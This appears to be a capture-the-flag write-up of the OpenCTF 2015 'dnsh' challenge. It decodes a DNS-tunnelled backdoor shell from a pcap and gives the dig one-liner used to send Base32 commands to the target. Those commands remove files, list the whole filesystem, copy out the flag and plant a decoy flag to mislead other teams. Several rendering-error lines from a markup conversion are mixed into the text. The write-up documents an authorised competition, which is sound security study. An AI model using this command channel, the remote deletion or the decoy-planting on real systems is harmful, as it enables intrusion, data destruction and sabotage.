---
title: "OpenCTF 2015 - dnsh (botnet,pwnable 100) Writeup"
slug: "openctf-2015-dnsh-botnetpwnable-100-writeup"
date: "2015-08-12 09:10:23.834843"
author_name: "reidb"
author_email: "reid.borsuk@gmail.com"
draft: false
toc: false
images:
---

Hint:

> dnsh 100 --- Our IDS picked up this CnC traffic - please ANALyze it - 172.16.18.20/dnsh-985199bc2d4d732db28f8ba1ccfc6702

The provided pcap contains a HTTP request that results in a 404, a bunch of weird DNS queries, followed by the previously 404 request succeeding. Brute force decoding reveals that the DNS queries are a back door shell. The DNS queries are of the form:

"System Message: ERROR/3 (<string>:, line 7)"
Content block expected for the "code" directive; none found.

{language=python}
~~~~~~~~
.. code:: {Base32_encoded_command}.{Hex_representation_of_MD5_of_Base32_encded_command}.goatse.cx

~~~~~~~~

Decoding the queries in the pcap shows that the webserver files are in ~/www/files/:

{language=python}
~~~~~~~~
cp /var/www/html/*.swf ~/.
mv *.swf ~/www/files/.
~~~~~~~~

A very quick and dirty script to push commands to the target server was written by Javantea:

"System Message: ERROR/3 (<string>:, line 18)"
Error in "code" directive:
maximum 1 argument(s) allowed, 11 supplied.

{language=python}
~~~~~~~~
.. code:: dig @10.10.53.53 <base32 string>.$(echo -n <base32 string> |md5sum |head -c 32).goatse.cx

~~~~~~~~

For instance, to run [rm ~/www/files/n*], a necessary step to remove all of our flag files after the challenge is completed, you can run the following command:

"System Message: ERROR/3 (<string>:, line 22)"
Error in "code" directive:
maximum 1 argument(s) allowed, 9 supplied.

{language=python}
~~~~~~~~
.. code:: dig @10.10.53.53 OJWSA7RPO53XOL3GNFWGK4ZPNYVA.$(echo -n OJWSA7RPO53XOL3GNFWGK4ZPNYVA |md5sum |head -c 32).goatse.cx

~~~~~~~~

Only a small amount of trouble is caused by the length limitations in DNS queries. Unfortunately the flag doesn't seem to be in any obvious locations near CWD, so instead the whole hard drive is scrubbed:

"System Message: ERROR/3 (<string>:, line 26)"
Error in "code" directive:
maximum 1 argument(s) allowed, 5 supplied.

{language=python}
~~~~~~~~
.. code:: ls -alR / > www/files/neg9.txt

~~~~~~~~

The flag was then found at /var/www/.hide/ctf_flag.txt. At this point we started hitting length limitations in our DNS queries, so a slightly creative command was written to compress it:

"System Message: ERROR/3 (<string>:, line 30)"
Error in "code" directive:
maximum 1 argument(s) allowed, 3 supplied.

{language=python}
~~~~~~~~
.. code:: cp /var/w*/.h*/c*.txt www/files/n

~~~~~~~~

Requesting the n document revealed the key:

"System Message: ERROR/3 (<string>:, line 34)"
Content block expected for the "code" directive; none found.

{language=python}
~~~~~~~~
.. code:: s0m3thing_Cl3veR_ab0u7_b0tn3ts_g03s_her3

~~~~~~~~

This was followed by some light trolling to mess with any teams after us:

"System Message: ERROR/3 (<string>:, line 38)"
Error in "code" directive:
maximum 1 argument(s) allowed, 4 supplied.

{language=python}
~~~~~~~~
.. code:: echo "th3_c@t_is_#1" > flag.txt
~~~~~~~~
